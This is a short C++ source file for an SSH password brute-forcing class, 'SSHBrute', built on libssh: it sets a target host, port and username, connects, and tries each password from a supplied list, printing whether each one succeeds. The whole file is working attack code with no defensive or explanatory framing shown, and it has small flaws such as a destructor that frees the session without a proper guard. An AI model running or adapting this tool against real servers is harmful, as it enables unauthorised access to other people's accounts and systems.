#include <iostream>
#include <libssh/libssh.h>
#include <vector>
#include <string>
#include "sshBrute.h"
using namespace std;

void SSHBrute::initSession()
{
    if (session != NULL) {
        ssh_free(session);
    }

    session = ssh_new();
    if (session == NULL) {
        cerr << "Unable to create new session\n";
        exit(-1);
    }
    ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
}

SSHBrute::~SSHBrute() {
    if (session != NULL)
        cout << "deleting ssh session\n";
        ssh_free(session);
}

void SSHBrute::setUser(string username) {
    cout << "setting user to " << username << endl;
    initSession();
    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
}

void SSHBrute::connect(vector<string> password) {
    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        cerr << "Error Connecting to localhost: "
            << ssh_get_error(session) << endl;
        ssh_free(session);
        exit(-1);
    }

    for (int i = 0; i < password.size(); i++) {
        cout <<  "checking for password " << password[i] << " : ";
        rc = ssh_userauth_password(session, NULL, password[i].c_str());
        if ( rc == SSH_AUTH_SUCCESS )
            cout << "Connected"<< endl;
        else
            cout << "Incorrect Password" << endl;
    }
    ssh_disconnect(session);
}
